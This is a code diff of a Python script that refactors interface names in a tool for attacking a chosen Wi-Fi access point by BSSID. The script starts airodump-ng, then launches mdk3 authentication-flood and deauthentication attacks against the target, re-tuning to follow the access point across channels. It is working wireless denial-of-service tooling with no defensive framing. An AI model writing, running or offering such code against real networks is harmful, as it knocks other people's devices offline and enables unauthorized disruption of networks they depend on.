@@ -16,6 +16,9 @@ console: Console = Console()
 
 install()
 
+INTERFACE_1 = "wlan0"
+INTERFACE_2 = "wlan0mon"
+
 
 class Target:
     obj = None
@@ -31,12 +34,12 @@ class Target:
         self.channel = None
 
     def __setattr__(self, name: str, value: Any, /) -> None:
-        if hasattr(self, name) and getattr(self, name) != value:
+        if hasattr(self, name):
             super().__setattr__(name, value)
             print(self)
 
-            logger.info("Set up the wlan0mon link.")
-            subprocess.run(["sudo", "ip", "link", "set", "wlan0mon", "up"])
+            logger.info(f"Set up the {INTERFACE_2} link.")
+            subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "up"])
 
             logger.info(f"Starting the <b>airodump-ng</b> sub process...")
             threading.Thread(
@@ -54,7 +57,7 @@ class Target:
                         f"{self.bssid}",
                         "--channel",
                         f"{self.channel}",
-                        "wlan0mon",
+                        INTERFACE_2,
                     ],
                 ),
                 kwargs={"stdout": open(os.devnull, "wt")},
@@ -63,13 +66,15 @@ class Target:
             logger.info("Starting the <b>mdk3</b> sub processes...")
             threading.Thread(
                 target=subprocess.run,
-                args=(["sudo", "mdk3", "wlan0mon", "a", "-a", self.bssid, "-c", "-m"],),
+                args=(
+                    ["sudo", "mdk3", INTERFACE_2, "a", "-a", self.bssid, "-c", "-m"],
+                ),
                 kwargs={"stdout": open(os.devnull, "wt")},
             ).start()
 
             threading.Thread(
                 target=subprocess.run,
-                args=(["sudo", "mdk3", "wlan0mon", "d"],),
+                args=(["sudo", "mdk3", INTERFACE_2, "d"],),
                 kwargs={"stdout": open(os.devnull, "wt")},
             ).start()
 
@@ -85,8 +90,8 @@ def refresh(interface: str):
         os.system("sudo pkill -9 mdk3")
         os.system("sudo pkill -9 airodump-ng")
 
-        logger.info(f"Set down the wlan0mon link.")
-        subprocess.run(["sudo", "ip", "link", "set", "wlan0mon", "down"])
+        logger.info(f"Set down the {INTERFACE_2} link.")
+        subprocess.run(["sudo", "ip", "link", "set", INTERFACE_2, "down"])
 
         logger.info(f"Set up the {interface} link.")
         subprocess.run(["sudo", "ip", "link", "set", interface, "up"])
@@ -133,19 +138,20 @@ def refresh(interface: str):
 
         dct = dict(lst)
 
-        if Target.obj is not None:
-            if channel := dct.get(Target.obj.bssid):
-                logger.info(f"Update channel to {channel!r}.")
-                Target.obj.channel = channel
+        if Target.obj is not None and (channel := dct.get(Target.obj.bssid)):
+            logger.info(f"Update channel to {channel!r}.")
+            Target.obj.channel = channel
 
-                logger.info("Sleep 15 for seconds.")
-                sleep(15)
+            logger.info("Sleep 15 for seconds.")
+            sleep(15)
+
+        sleep(2.5)
 
 
 @click.command()
 @click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
 def main(bssid: str) -> None:
-    threading.Thread(target=refresh, args=("wlan0",)).start()
+    threading.Thread(target=refresh, args=(INTERFACE_1,)).start()
 
     Target(bssid)
 
